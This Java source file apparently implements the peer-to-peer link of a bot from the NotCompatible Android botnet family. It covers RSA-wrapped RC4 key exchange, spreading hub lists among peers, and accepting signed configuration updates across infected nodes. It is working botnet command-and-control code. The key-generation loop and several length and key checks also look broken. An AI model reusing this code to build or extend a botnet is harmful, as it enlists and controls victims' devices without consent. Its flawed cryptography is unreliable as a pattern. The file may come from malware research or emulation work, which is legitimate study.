package diff.notcompatible.c.bot.net.tcp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.logging.Logger;

import diff.notcompatible.c.bot.ThreadServer;
import diff.notcompatible.c.bot.crypto.RC4;
import diff.notcompatible.c.bot.crypto.RSA;
import diff.notcompatible.c.bot.objects.HubListItem;
import diff.notcompatible.c.bot.objects.MyBuffer;
import diff.notcompatible.c.bot.objects.Packet;

public class P2PLink extends TCPSocket {

	private final static Logger LOGGER = Logger.getLogger("session");
	
	public boolean isIncoming;
	public SocketChannel channel;
	public InetSocketAddress socketAddress;
	public SelectionKey selfKey;
	public boolean isOnlyHub;
	public boolean isEncrypt;
	public int status;
	public long lastUsedTime;
	public long lastConnect;
	public ThreadServer owner;
	public Selector selector;
	public MyBuffer receiveBuffer;
	public HubListItem hr;
    private RC4 rc4Instream;
    private RC4 rc4Outstream;
	
	public P2PLink(ThreadServer newOwner) {
        isEncrypt = false;
        status = 0;
        lastConnect = 0;
        isIncoming = false;
        isOnlyHub = false;
        lastUsedTime = 0;
        owner = newOwner;
        selector = newOwner.nio.selector;
        receiveBuffer = new MyBuffer();
	}

	public void init() {
		receiveBuffer.clear();
		status = 0;
		isEncrypt = false;
		isIncoming = false;
		sendAndClose = false;
		isOnlyHub = false;
		rc4Instream = null;
		rc4Outstream = null;
		socketAddress = null;
		hr = null;
	}
	
	public void connect(InetSocketAddress newSocketAddress) {
        try {
        	LOGGER.info(" [!] Attempting to make a P2P connection to : " + newSocketAddress.getHostName() + "/" + newSocketAddress.getPort());
        	isIncoming = false;
            status = 1;
            lastConnect = System.currentTimeMillis();
            channel = SocketChannel.open();
            channel.configureBlocking(false);
            socketAddress = newSocketAddress;
            channel.connect(socketAddress);
            if (selector != null) {
                selfKey = channel.register(selector, 8);
                selfKey.attach(this);
                owner.nio.register(this);
            }
        } catch (IOException e) {
        	try{
        		onNoConnect(selfKey);
	        } catch (IOException exception) {
	        	exception.printStackTrace();
	        }
        }
	}
	
	public void close() {
		try {
			onClose(selfKey);
		} catch(Exception exception) {
			exception.printStackTrace();
		}
	}
	
	public void parseCommand() {
		Packet packet = null;
		while((packet = Packet.unpack(receiveBuffer)) != null) {
			if(packet.tag.equals("HELO")) {
				recvHello(packet);
			} else if(packet.tag.equals("GETSET")) {
				sendSET(packet);
			} else if(packet.tag.equals("GETHUB")) {
				sendHubList();
			} else if(packet.tag.equals("HUBLIST")) {
				owner.hubList.loadFromPacket(packet);
				owner.saveHubList();
			} else if(packet.tag.equals("UDPHUBLIST")) {
				owner.udpList.loadFromPacket(packet);
				owner.saveUDPHubList();
			} else if(packet.tag.equals("SET")) {
				recvSET(packet);
			} else if(packet.tag.equals("SUIP")) {
				recvSUIP(packet);
			} else if(packet.tag.equals("LID")) {
				recvLID(packet);
			}
		}
	}

	public boolean isConnected() {
		return isEncrypt && channel.socket().isConnected() && status == 3;
	}
	
	public void recvHello(Packet packet) {
		LOGGER.info(" [+] Receiving a Hello over P2P");
		int port = 0;
		Packet portPacket = packet.getByName("PORT");
		
		if (portPacket != null) {
		    port = portPacket.asPort();
		    hr = owner.hubList.getByIpAndPort(channel.socket().getInetAddress().getHostAddress(), port);
		    if (hr != null) {
		        if (!hr.used) {
		            hr.used = true;
		            hr.lastConnect = System.currentTimeMillis();
		            hr.lastTested = System.currentTimeMillis();
		            hr.connectCount = 0;
		            hr.status = 1;
		            owner.saveHubList();
		        } else {
		            close();
		            return;
		        }
		    }
		}
		
		P2PLink p2p;
		if (portPacket != null && packet.getByName("OP") != null || hr != null) {
		    sendSUIP();
		    sendLID();
		    if (!isOnlyHub) {
		        sendSET();
		        sendHubList();
		        sendAndClose = true;
		    }
		} else {
		    hr = owner.hubList.add();
		    hr.ip = channel.socket().getInetAddress().getHostAddress();
		    hr.port = port;
		    hr.used = true;
		    hr.lastConnect = System.currentTimeMillis();
		    hr.lastTested = System.currentTimeMillis();
		    hr.connectCount = 0;
		    hr.status = 1;
		    owner.saveHubList();
		    sendSUIP();
		    sendLID();
		    if (!isOnlyHub) {
		        sendSET();
		        sendHubList();
		        sendAndClose = true;
		    }
		}
		
        p2p = new P2PLink(owner);
        p2p.connect(new InetSocketAddress(channel.socket().getInetAddress().getHostAddress(), port));
        owner.p2plist.add(p2p);
	}
	
	public void recvSET(Packet packet) {
		LOGGER.info(" [+] Receiving a SET over P2P");
		Packet dataPacket = packet.getByName("DATA");
		if(dataPacket != null) {
			Packet signPacket = dataPacket.getByName("Sign");
            if (signPacket != null) {
            	Packet lidPacket = dataPacket.getByName("LID");
            	// Verify the set packet
                if (lidPacket != null &&
                		owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket.asInt64() &&
                		owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
                	// Delete old one and save new config
                    owner.config.packet.delete("SET");
                    owner.config.packet.add(dataPacket);
                    owner.config.save(owner.sessionDirectory);
                    owner.connectionManager.load();
                    owner.sendSET();
                }
            }
		}
	}
	
	public void recvSUIP(Packet packet) {
		LOGGER.info(" [+] Receiving a SUIP over P2P");
		owner.IPDetected(packet.asIP());
	}
	
	public void recvLID(Packet packet) {
		LOGGER.info(" [+] Receiving a LID over P2P");
		// Is nodes settings higher than ours?
		if(owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < packet.asInt64()) {
			sendGetSET();
		} else {
			sendSET();
		}
	}

	public void sendEncrypt(byte[] data) {
		try {
			send(rc4Outstream.crypt(data));
		} catch(IOException exception) {
			close();
		}
	}

	public void sendGetHubList() {
		LOGGER.info(" [+] Sending a GetHubList over P2P");
		Packet getHubPacket = new Packet();
		getHubPacket.tag = "GETHUB";
		sendEncrypt(getHubPacket.pack());
	}
	
	public void sendGetSET() {
		LOGGER.info(" [+] Sending a GetSET over P2P");
		Packet getSetPacket = new Packet();
		getSetPacket.tag = "GETSET";
		sendEncrypt(getSetPacket.pack());
	}
	
	public void sendSUIP() {
		LOGGER.info(" [+] Sending a SUIP over P2P");
		Packet suipPacket = new Packet();
		suipPacket.tag = "SUIP";
		suipPacket.buffer.putIP(channel.socket().getInetAddress().getHostAddress());
		sendEncrypt(suipPacket.pack());
	}
	
	public void sendSET(Packet packet) {
		LOGGER.info(" [+] Sending a SET over P2P");
		sendEncrypt(owner.config.packet.getByName("SET").pack());
	}
	
	public void sendHubList() {
		LOGGER.info(" [+] Sending a HubList over P2P");
		sendEncrypt(owner.hubList.getHubListFordSend().pack());
		sendEncrypt(owner.udpList.getHubListFordSend().pack());
	}
	
	public void sendHello() {
		LOGGER.info(" [+] Sending a Hello over P2P");
		Packet helloPacket = new Packet();
		helloPacket.tag = "HELO";
		
		Packet versionPacket = helloPacket.add();
		versionPacket.tag = "VER";
		versionPacket.buffer.putDword(2);
		
		Packet uuidPacket = helloPacket.add();
		uuidPacket.tag = "UUID";
		uuidPacket.buffer.put(owner.config.packet.getByName("UUID").array());
		
		Packet portPacket = helloPacket.add();
		portPacket.tag = "PORT";
		portPacket.buffer.putWord(owner.config.packet.getByName("PORT").asPort());
		
		if(owner.isOpenPort) {
			Packet openPortPacket = helloPacket.add();
			openPortPacket.tag = "OP";
			openPortPacket.buffer.putWord(owner.config.packet.getByName("PORT").asPort());
		}
		
		if(owner.isOpenPortTested < 10) {
			Packet testMePacket = helloPacket.add();
			testMePacket.tag = "TM";
			testMePacket.buffer.putWord(owner.config.packet.getByName("PORT").asPort());
			owner.isOpenPortTested++;
		}
		
		sendEncrypt(helloPacket.pack());
	}
	
	public void sendSET() {
		LOGGER.info(" [+] Sending a SET over P2P");
		sendEncrypt(owner.config.packet.getByName("SET").pack());
	}
	
	public void sendLID() {
		LOGGER.info(" [+] Sending a LID over P2P");
		Packet lidPacket = new Packet();
		lidPacket.tag = "LID";
		lidPacket.buffer.putInt64(owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64());
		sendEncrypt(lidPacket.pack());
	}

	@Override
	public void onClose(SelectionKey key) throws IOException {
		super.onClose(key);
		
		channel.close();
		owner.p2plist.delete(this);
		if(hr != null) {
			hr.used = false;
			if(hr.status != 1)
				hr.status = -1;
		}
		
		status = 0;
	}

	@Override
	public void onConnect(SelectionKey key) throws IOException {
		super.onConnect(key);
		
		lastUsedTime = System.currentTimeMillis();
		if(hr != null) {
			byte[] modulus = owner.RSALocal.rsaPublicKey.getModulus().toByteArray();
			if(modulus[0] == 0x00) {
				byte[] tmp = new byte[modulus.length - 1];
				System.arraycopy(modulus, 1, tmp, 0, tmp.length);
				modulus = tmp;
			}
			
			MyBuffer buffer = new MyBuffer();
			buffer.putDword(modulus.length);
			buffer.put(modulus);
			
			send(buffer.array());
			status = 2;
		} else {
			hr = owner.hubList.getByIpAndPort(channel.socket().getInetAddress().getHostAddress(), channel.socket().getPort());
			if(hr == null)
				hr = owner.hubList.add();
			hr.ip = channel.socket().getInetAddress().getHostAddress();
			hr.port = channel.socket().getPort();
			hr.lastConnect = lastUsedTime;
			hr.lastTested = lastUsedTime;
			hr.status = 1;
			owner.saveHubList();
			close();
		}
	}

	@Override
	public void onNoConnect(SelectionKey key) throws IOException {
		super.onNoConnect(key);
		
		if(hr != null) {
			hr.used = false;
			hr.status = -1;
		}
		
		owner.p2plist.delete(this);
		status = 0;
	}

	@Override
	public void onRead(SelectionKey key) throws IOException {
		super.onRead(key);
		
        lastUsedTime = System.currentTimeMillis();
        if (isEncrypt) {
            receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
            readBuffer.clear();
        }
        int dataLength;
        RSA tmpRSA;
        byte[] rsaBuff;
        byte[] tmp;
        byte[] rc4key;
        MyBuffer mb;
        byte[] tmp2;
        if (isIncoming || status != 2 || readBuffer.size <= 4) {
            if (status != 0 && isIncoming || readBuffer.size <= 4) {
                if (receiveBuffer.size > 0 && status == 3) {
                    parseCommand();
                }
            } else {
                dataLength = readBuffer.asDWord();
                readBuffer.shift(4);
                if (dataLength <= readBuffer.size) {
                    close();
                } else {
                    tmpRSA = new RSA();
                    rsaBuff = new byte[dataLength];
                    System.arraycopy(readBuffer.array(), 0, rsaBuff, 0, dataLength);
                    readBuffer.shift(dataLength);
                    if (!tmpRSA.loadPublic(rsaBuff)) {
                    	// Create a rc4 keyset
                        tmp = new byte[101];
                    	for(int i = 0; i < tmp.length; i++)
                    		tmp[1] = (byte) ((int) Math.round(Math.random() * 256));
                        tmp[0] = (byte) 7;
                        rc4key = new byte[100];
                        System.arraycopy(tmp, 1, rc4key, 0, 100);
                        
                        rc4Instream = new RC4(rc4key);
                        rc4Outstream = new RC4(rc4key);
                        isEncrypt = true;
                        mb = new MyBuffer();
                        tmp2 = tmpRSA.encrypt(tmp);
                        mb.putDword(tmp2.length);
                        mb.put(tmp2);
                        send(mb);
                        status = 3;
                        if (receiveBuffer.size > 0 && status == 3) {
                            parseCommand();
                        }
                    } else {
                        close();
                    }
                }
            }
        } else {
            dataLength = readBuffer.asDWord();
            readBuffer.shift(4);
            if (dataLength > readBuffer.size) {
                close();
            } else {
                tmp = new byte[dataLength];
                System.arraycopy(readBuffer.array(), 0, tmp, 0, tmp.length);
                readBuffer.shift(dataLength);
                byte[] tmp2_2 = new byte[100];
                System.arraycopy(owner.RSALocal.decrypt(tmp), 1, tmp2_2, 0, tmp2_2.length);
                rc4key = tmp2_2;
                rc4Instream = new RC4(rc4key);
                rc4Outstream = new RC4(rc4key);
                isEncrypt = true;
                receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
                readBuffer.clear();
                status = 3;
                sendHello();
                hr.connectCount = 0;
                hr.lastConnect = System.currentTimeMillis();
                hr.status = 1;
                if (status != 0 && isIncoming || readBuffer.size <= 4) {
                    if (receiveBuffer.size > 0 && status == 3) {
                        parseCommand();
                    }
                } else {
                    dataLength = readBuffer.asDWord();
                    readBuffer.shift(4);
                    if (dataLength <= readBuffer.size) {
                        tmpRSA = new RSA();
                        rsaBuff = new byte[dataLength];
                        System.arraycopy(readBuffer.array(), 0, rsaBuff, 0, dataLength);
                        readBuffer.shift(dataLength);
                        if (tmpRSA.loadPublic(rsaBuff)) {
                            close();
                        } else {
                            tmp = new byte[101];
                        	for(int i = 0; i < tmp.length; i++)
                        		tmp[1] = (byte) ((int) Math.round(Math.random() * 256));
                            tmp[0] = (byte) 7;
                            rc4key = new byte[100];
                            System.arraycopy(tmp, 1, rc4key, 0, 100);
                            rc4Instream = new RC4(rc4key);
                            rc4Outstream = new RC4(rc4key);
                            isEncrypt = true;
                            mb = new MyBuffer();
                            tmp2 = tmpRSA.encrypt(tmp);
                            mb.putDword(tmp2.length);
                            mb.put(tmp2);
                            send(mb);
                            status = 3;
                            if (receiveBuffer.size > 0 && status == 3) {
                                parseCommand();
                            }
                        }
                    } else {
                        close();
                    }
                }
            }
        }
	}
	
	
}
